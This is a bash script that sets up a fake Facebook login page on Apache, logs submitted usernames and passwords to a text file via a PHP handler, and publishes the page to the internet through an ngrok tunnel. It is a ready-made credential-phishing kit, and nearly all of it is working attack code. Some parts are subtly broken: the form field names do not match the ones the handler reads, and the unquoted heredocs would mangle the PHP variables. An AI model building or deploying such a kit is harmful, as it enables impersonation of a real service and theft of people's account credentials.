#!/bin/bash

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Please run as root!${NC}"
  exit
fi

echo -e "${GREEN}Starting automatic setup for Fake Facebook Platform...${NC}"

# Update and install required packages
echo -e "${GREEN}Updating system and installing required packages...${NC}"
apt update && apt install -y apache2 php unzip wget

# Start Apache server
echo -e "${GREEN}Starting Apache web server...${NC}"
systemctl start apache2
systemctl enable apache2

# Navigate to the web server directory
cd /var/www/html/

# Create the HTML file for the fake Facebook page
echo -e "${GREEN}Creating fake Facebook login page...${NC}"
cat <<EOL > index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { text-align: center; width: 360px; }
        .logo { font-size: 36px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
        .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        .btn { background-color: #1877f2; color: white; padding: 10px; border: none; border-radius: 4px; width: 100%; cursor: pointer; }
        .btn:hover { background-color: #145dbf; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Facebook</div>
        <div class="login-box">
            <form method="POST" action="form_handler.php">
                <input type="text" name="username" placeholder="Email or Phone" class="input-field" required>
                <input type="password" name="password" placeholder="Password" class="input-field" required>
                <button type="submit" class="btn">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
EOL

# Create the PHP script for handling login data
echo -e "${GREEN}Creating PHP script to log credentials...${NC}"
cat <<EOL > form_handler.php
<?php
if (isset($_POST['email']) && isset($_POST['password'])) {
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $_POST['email'] . ", Password: " . $_POST['password'] . "\n");
    fclose($file);
    header("Location: https://facebook.com");
    exit();
}
?>
EOL

# Install and configure ngrok
echo -e "${GREEN}Setting up ngrok...${NC}"
cd /root/
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
mv ngrok /usr/local/bin/
read -p "Enter your ngrok auth token: " NGROK_TOKEN
ngrok config add-authtoken $NGROK_TOKEN

# Start ngrok tunnel
echo -e "${GREEN}Starting ngrok tunnel...${NC}"
cd /var/www/html/
ngrok http 80 &

# Provide instructions
echo -e "${GREEN}Setup Complete!${NC}"
echo -e "${GREEN}You can access your fake Facebook platform using the ngrok URL displayed above.${NC}"
echo -e "${GREEN}Log data will be stored in: /var/www/html/log.txt${NC}"
